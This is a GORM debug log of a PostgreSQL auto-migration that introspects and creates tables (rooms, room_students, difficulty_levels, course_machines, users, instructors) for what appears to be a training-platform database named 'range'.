[0m[33m[1.274ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.148ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.359ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.259ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.173ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.147ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.317ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.227ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.870ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.838ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.636ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'room_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.185ms] [34;1m[rows:0][0m CREATE TABLE "room_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"member_id" bigint,"room_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_room_students_student" FOREIGN KEY ("member_id") REFERENCES "students"("id"),CONSTRAINT "fk_room_students_room" FOREIGN KEY ("room_id") REFERENCES "rooms"("id"))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.049ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_room_students_deleted_at" ON "room_students" ("deleted_at")

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.796ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.405ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.869ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.856ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.760ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.152ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.732ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.160ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.572ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.349ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.587ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.750ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.073ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.792ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[31.302ms] [34;1m[rows:0][0m CREATE TABLE "course_machines" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"title" text NOT NULL,"description" text NOT NULL,"point" bigint NOT NULL,"difficulty_level_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_course_machines_difficulty_level" FOREIGN KEY ("difficulty_level_id") REFERENCES "difficulty_levels"("id"),CONSTRAINT "uni_course_machines_title" UNIQUE ("title"))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.215ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_course_machines_deleted_at" ON "course_machines" ("deleted_at")

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.156ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.166ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.008ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.879ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.707ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[23.237ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.066ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.550ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.261ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.151ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.732ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.781ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.695ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.211ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.010ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.629ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.529ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.476ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.121ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.491ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.404ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.209ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.804ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.409ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.834ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.611ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.674ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[18.009ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.648ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.069ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

